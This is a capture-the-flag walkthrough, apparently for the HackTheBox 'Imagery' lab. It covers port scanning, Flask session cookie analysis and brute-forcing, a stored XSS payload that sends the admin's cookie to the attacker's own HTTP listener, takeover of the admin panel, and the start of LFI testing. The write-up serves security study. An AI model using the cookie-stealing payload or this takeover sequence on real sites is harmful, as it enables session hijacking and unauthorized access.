![[Pasted_image_20250928090546.png]]

## Recon

### Port Scan

```bash
 sudo nmap -Pn -p- --min-rate 3000 -T 3 -oN imagery-port-scan.txt 10.129.72.229
[sudo] password for darklight: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 09:02 EAT
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Warning: 10.129.72.229 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.72.229
Host is up (0.91s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 63.53 seconds
```

### Web Exploitation

![[Pasted_image_20250928091303.png]]

![[Pasted_image_20250928091852.png]]

We can upload images and also the application filters the images based on the owner(personalized gallery). That means the application has a functionality of identifying users , the attack surface for this would be to try and access other users files. After creating an account and logging in, am assigned a session cookie.

```
.eJyrVkrJLC7ISaz0TFGyUjI2SU41sLBMUtJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSn5qQ7puYmZOXrJ-blKtQCCvC5Q.aNjRlQ.An77K78uzu0iowE4UEBdA_zweuI
```

It is a **Flask `session` cookie**. 

Checking at the technologies used in the application i get this 

![[Pasted_image_20250928092334.png]]


### Flask Session cookie attacks

Am going to use [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) to test securiy measure in place for cookie attacks.

Decoding the cookie i get this 

```bash
flask-unsign --decode --cookie ".eJyrVkrJLC7ISaz0TFGyUjI2SU41sLBMUtJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSn5qQ7puYmZOXrJ-blKtQCCvC5Q.aNjRlQ.An77K78uzu0iowE4UEBdA_zweuI"

{'displayId': '34ce089b', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'doe@gmail.com'}
```

This, `isAdmin': False`,  shows that maybe the application has other functionalities other than uploading an image which are not accessible a normal user.

We will need to  know the secret key used to sign the cookie so that we can create a valid cookie.

Trying to manually manipulate the signature value results to requests being unauthorized which indicates the session cookie are being verified.

Bruteforcing the secret key fails 

```bash
flask-unsign --unsign --cookie ".eJyrVkrJLC7ISaz0TFGyUjI2SU41sLBMUtJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSn5qQ7puYmZOXrJ-blKtQCCvC5Q.aNjRlQ.An77K78uzu0iowE4UEBdA_zweuI"
[*] Session decodes to: {'displayId': '34ce089b', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'doe@gmail.com'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2304): -----BEGIN PRIVATE KEY-----CR
[*] Attempted (39040): w.;>{19f39c49975dbdd23b378e6d3
[!] Failed to find secret key after 55982 attempts.am


flask-unsign --unsign --wordlist '/usr/share/wordlists/rockyou.txt' --cookie ".eJyrVkrJLC7ISaz0TFGyUjI2SU41sLBMUtJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSn5qQ7puYmZOXrJ-blKtQCCvC5Q.aNjRlQ.An77K78uzu0iowE4UEBdA_zweuI"  --no-literal-eval
[*] Session decodes to: {'displayId': '34ce089b', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'doe@gmail.com'}
[*] Starting brute-forcer with 8 threads..
[!] Failed to find secret key after 14344392 attempts.nd
```


When uploading am image, to bypass the extension check i tried to use the `null byte` The image was beig uploaded but the .jpg extension was also being preserved 

![[Pasted_image_20250928101206.png]]

![[Pasted_image_20250928101255.png]]

For DNS and directory enumeration i got nothing 

Under quick links there is another link 
![[Pasted_image_20250928103908.png]]

We submit a bug then the admin reviews it 

![[Pasted_image_20250928104031.png]]

The `http-only` flag is not set, with this we could be able to steal the admins cookie, if the site is also vulnerable to xss. 

![[Pasted_image_20250928110442.png]]

Payload

```bash
<img src=1 onerror="fetch('http://10.10.16.19:8000?cookie='+ document.cookie)"></img>
```

On the server i get this the cookie

```bash
└─$ python3 -m http.server                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.72.229 - - [28/Sep/2025 11:02:12] code 404, message File not found
10.129.72.229 - - [28/Sep/2025 11:02:12] "GET /cookie=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNjrgQ.Ro7c1Thpal8HuFW-7T6BS6EgDXA HTTP/1.1" 404 -
```

decoding the cookie 

```bash
 flask-unsign --decode --cookie '.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNjrgQ.Ro7c1Thpal8HuFW-7T6BS6EgDXA'
{'displayId': 'a1b2c3d4', 'isAdmin': True, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'admin@imagery.htb'}
```

Now we got an admin cookie but we dont know the admin path.

inspecting the application code i get this.

![[Pasted_image_20250928111329.png]]

we have an `adminpanel` button that is hidden from us.. upading my cookie in the broswer and refreshing the page the admin panel button appears.

![[Pasted_image_20250928111514.png]]

![[Pasted_image_20250928111831.png]]

hitting the download log button i get this.

![[Pasted_image_20250928111947.png]]

Testing for LFI

![[Pasted_image_20250928112100.png]]

There is a user `mark`, but it seems we dont have access to his home directory

![[Pasted_image_20250928112458.png]]

